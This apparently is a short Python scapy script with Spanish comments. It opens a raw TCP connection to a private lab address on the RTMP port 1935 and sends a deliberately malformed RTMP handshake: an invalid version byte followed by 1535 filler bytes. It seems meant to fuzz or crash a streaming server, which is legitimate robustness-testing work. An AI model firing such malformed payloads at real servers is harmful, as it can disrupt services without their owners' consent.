from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

target_ip = "172.18.0.2"
target_port = 1935

# Establecer conexión TCP (3-way handshake)
syn = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
syn_ack = sr1(syn, verbose=0)
sport = syn_ack[TCP].dport  # Use the same source port as in the handshake
seq = syn_ack[TCP].ack
ack_num = syn_ack[TCP].seq + 1
ack = IP(dst=target_ip) / TCP(dport=target_port, sport=sport, flags="A", seq=seq, ack=ack_num)
send(ack, verbose=0)

# Enviar handshake RTMP malformado (C0 + C1)
malformed_handshake = b"\x05" + b"\x41" * 1535  # Versión 5 (inválida) + basura
pkt = IP(dst=target_ip) / TCP(dport=target_port, sport=sport, flags="PA", seq=seq, ack=ack_num) / Raw(load=malformed_handshake)
send(pkt, verbose=1)
